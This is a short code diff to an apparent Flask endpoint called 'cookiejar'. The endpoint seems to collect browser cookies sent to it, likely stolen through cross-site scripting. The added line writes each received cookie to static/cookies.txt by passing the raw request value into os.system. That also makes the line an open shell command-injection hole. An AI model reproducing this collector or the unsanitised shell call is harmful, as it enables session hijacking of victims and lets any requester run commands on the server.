@@ -7,6 +7,7 @@ def cookiejar():
 	cookie = request.args.get('c')
 	if cookie:
 		print cookie
+		os.system('echo ' + cookie + ' >> static/cookies.txt')
 
 	return "thanks!"
 
